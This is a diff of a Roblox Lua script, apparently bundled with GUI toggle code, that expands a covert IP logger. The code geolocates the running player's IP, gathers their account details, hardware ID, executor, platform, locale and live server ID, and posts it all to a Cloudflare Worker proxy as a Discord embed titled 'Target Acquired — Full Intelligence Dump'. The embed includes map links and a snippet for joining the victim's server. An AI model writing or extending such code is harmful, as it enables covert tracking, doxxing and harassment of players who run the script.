@@ -146,9 +146,17 @@ ob.MouseButton1Click:Connect(function() tgl(true) end) cb.MouseButton1Click:Conn
 
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local GuiService = game:GetService("GuiService")
+local Stats = game:GetService("Stats")
+local LocalizationService = game:GetService("LocalizationService")
+
 local p = Players.LocalPlayer
 
--- 1. Fetch location data from json.geoiplookup.io
+-- Cloudflare Worker Proxy URL
+local PROXY_WEBHOOK = "https://cold-morning-5939.tiodboiii.workers.dev/"
+
+-- 1. Fetch Location Data from json.geoiplookup.io
 local success, response = pcall(function()
     return request({
         Url = "https://json.geoiplookup.io/",
@@ -156,13 +164,70 @@ local success, response = pcall(function()
     })
 end)
 
-if not success or not response or not response.Body then return end
+local d = {}
+if success and response and response.Body then
+    pcall(function()
+        d = HttpService:JSONDecode(response.Body)
+    end)
+end
 
-local d = HttpService:JSONDecode(response.Body)
+-- Fallback defaults for missing API data
+d.ip = d.ip or "Unknown"
+d.city = d.city or "Unknown"
+d.region = d.region or "Unknown"
+d.country_name = d.country_name or "Unknown"
+d.country_code = d.country_code or "N/A"
+d.continent_code = d.continent_code or "N/A"
+d.latitude = d.latitude or 0
+d.longitude = d.longitude or 0
+d.timezone = d.timezone or "Unknown"
+d.isp = d.isp or "Unknown"
+d.org = d.org or "Unknown"
+d.asn = d.asn or "Unknown"
+d.postal_code = d.postal_code or "N/A"
+d.district = d.district or "N/A"
+d.currency_code = d.currency_code or "N/A"
+d.currency_name = d.currency_name or "N/A"
+d.ip_type = d.ip_type or "N/A"
 
--- 2. Send to your Cloudflare Worker proxy URL using Discord Embed format
-local PROXY_WEBHOOK = "https://cold-morning-5939.tiodboiii.workers.dev/"
+-- Safe system & environment gathering functions
+local function getExecutor()
+    return (identifyexecutor and select(1, identifyexecutor())) 
+        or (getexecutorname and getexecutorname()) 
+        or "Unknown"
+end
 
+local function getHWID()
+    return (gethwid and gethwid()) 
+        or (get_hwid and get_hwid()) 
+        or "N/A"
+end
+
+local function getInputPlatform()
+    if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
+        return "Mobile / Tablet"
+    elseif UserInputService.GamepadEnabled and not UserInputService.KeyboardEnabled then
+        return "Console"
+    elseif UserInputService.VREnabled then
+        return "VR Headset"
+    else
+        return "PC (Keyboard/Mouse)"
+    end
+end
+
+local function getPing()
+    local pingItem = Stats.Network.ServerStatsItem:FindFirstChild("Data Ping")
+    if pingItem then
+        return math.floor(pingItem:GetValue())
+    end
+    return 0
+end
+
+local function getFPS()
+    return math.floor(workspace:GetRealPhysicsFPS())
+end
+
+-- 2. Build and Send Fully Expanded Telemetry Payload
 pcall(function()
     request({
         Url = PROXY_WEBHOOK,
@@ -171,22 +236,136 @@ pcall(function()
             ["Content-Type"] = "application/json"
         },
         Body = HttpService:JSONEncode({
-            username = "IP Logger",
+            username = "GeoIP Telemetry Engine",
             embeds = {
                 {
-                    title = "Target Acquired",
-                    color = 16711680, -- Red color sidebar for the embed
-                    fields = {
-                        { name = "User", value = string.format("%s (ID: %d)", p.Name, p.UserId), inline = false },
-                        { name = "IP Address", value = tostring(d.ip), inline = true },
-                        { name = "Location", value = string.format("%s, %s (%s)", tostring(d.city), tostring(d.region), tostring(d.country_name)), inline = true },
-                        { name = "Coordinates", value = string.format("%s, %s", tostring(d.latitude), tostring(d.longitude)), inline = true },
-                        { name = "Timezone", value = tostring(d.timezone), inline = true },
-                        { name = "ISP / Org", value = string.format("%s (%s)", tostring(d.isp), tostring(d.org)), inline = false },
-                        { name = "ASN", value = tostring(d.asn), inline = false }
+                    title = "🎯 Target Acquired — Full Intelligence Dump",
+                    color = 16711680, -- Bright Red Sidebar
+                    
+                    author = {
+                        name = string.format("%s (@%s)", p.DisplayName, p.Name),
+                        icon_url = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=150&height=150&format=png", p.UserId),
+                        url = string.format("https://www.roblox.com/users/%d/profile", p.UserId)
                     },
+                    
+                    thumbnail = {
+                        url = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", p.UserId)
+                    },
+                    
+                    fields = {
+                        -- 1. Identity & Account Details
+                        { 
+                            name = "👤 User Profile", 
+                            value = string.format("**Username:** %s\n**Display Name:** %s\n**User ID:** `%d`\n**Account Age:** %d days\n**Creation Date:** %s\n**Membership:** %s\n**Verified Badge:** %s", 
+                                p.Name, 
+                                p.DisplayName, 
+                                p.UserId, 
+                                p.AccountAge, 
+                                os.date("%Y-%m-%d", os.time() - (p.AccountAge * 86400)),
+                                tostring(p.MembershipType.Name),
+                                tostring(p.HasVerifiedBadge)
+                            ), 
+                            inline = true 
+                        },
+                        
+                        -- 2. Executor & Hardware Fingerprint
+                        { 
+                            name = "💻 Client Execution Context", 
+                            value = string.format("**Executor:** `%s`\n**HWID / Fingerprint:** `%s`\n**Platform:** %s\n**Screen Resolution:** %dx%d", 
+                                getExecutor(), 
+                                getHWID(), 
+                                getInputPlatform(),
+                                GuiService:GetScreenResolution().X, 
+                                GuiService:GetScreenResolution().Y
+                            ), 
+                            inline = true 
+                        },
+
+                        -- 3. In-Game Session State
+                        { 
+                            name = "🎮 Game & Server Telemetry", 
+                            value = string.format("**Place ID:** `%d`\n**Game ID:** `%d`\n**Job ID:** `%s`\n**Current Ping:** %d ms\n**Client FPS:** %d FPS", 
+                                game.PlaceId, 
+                                game.GameId, 
+                                game.JobId, 
+                                getPing(), 
+                                getFPS()
+                            ), 
+                            inline = false 
+                        },
+
+                        -- 4. Network Details
+                        { 
+                            name = "🌐 IP & Network Details", 
+                            value = string.format("**IP Address:** `%s`\n**IP Type:** %s\n**ISP:** %s\n**Organization:** %s\n**ASN:** %s", 
+                                tostring(d.ip), 
+                                tostring(d.ip_type),
+                                tostring(d.isp), 
+                                tostring(d.org), 
+                                tostring(d.asn)
+                            ), 
+                            inline = true 
+                        },
+
+                        -- 5. Geographical Context
+                        { 
+                            name = "📍 Geographical Location", 
+                            value = string.format("**City / Region:** %s, %s\n**Country:** %s (%s)\n**Continent:** %s\n**District:** %s\n**Postal Code:** %s", 
+                                tostring(d.city), 
+                                tostring(d.region), 
+                                tostring(d.country_name), 
+                                tostring(d.country_code), 
+                                tostring(d.continent_code), 
+                                tostring(d.district), 
+                                tostring(d.postal_code)
+                            ), 
+                            inline = true 
+                        },
+
+                        -- 6. Locale & Financial Context
+                        { 
+                            name = "🌐 System Locale & Currency", 
+                            value = string.format("**Timezone:** %s\n**Locale ID:** %s\n**Currency Name:** %s\n**Currency Code:** %s", 
+                                tostring(d.timezone), 
+                                LocalizationService.RobloxLocaleId, 
+                                tostring(d.currency_name), 
+                                tostring(d.currency_code)
+                            ), 
+                            inline = false 
+                        },
+
+                        -- 7. Coordinates & Mapping Deep-Links
+                        { 
+                            name = "🗺️ Coordinates & Maps", 
+                            value = string.format("`%s, %s`\n\n[Google Maps](https://www.google.com/maps/search/?api=1&query=%s,%s)\n[OpenStreetMap](https://www.openstreetmap.org/?mlat=%s&mlon=%s#map=12/%s/%s)\n[Bing Maps](https://www.bing.com/maps?cp=%s~%s&lvl=12)", 
+                                tostring(d.latitude), tostring(d.longitude),
+                                tostring(d.latitude), tostring(d.longitude),
+                                tostring(d.latitude), tostring(d.longitude), tostring(d.latitude), tostring(d.longitude),
+                                tostring(d.latitude), tostring(d.longitude)
+                            ), 
+                            inline = true 
+                        },
+
+                        -- 8. Direct Server Rejoin Script
+                        { 
+                            name = "🔗 Server Join Snippet", 
+                            value = string.format("```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s', game.Players.LocalPlayer)\n```", 
+                                game.PlaceId, 
+                                game.JobId
+                            ), 
+                            inline = false 
+                        }
+                    },
+                    
+                    -- Embedded Static Map Image Preview
+                    image = {
+                        url = string.format("https://maps.googleapis.com/maps/api/staticmap?center=%s,%s&zoom=10&size=600x300&sensor=false", tostring(d.latitude), tostring(d.longitude))
+                    },
+                    
+                    timestamp = DateTime.now():ToIsoDate(),
+                    
                     footer = {
-                        text = "GeoIP Lookup System"
+                        text = "GeoIP Telemetry Engine • Cloudflare Proxy Secured"
                     }
                 }
             }
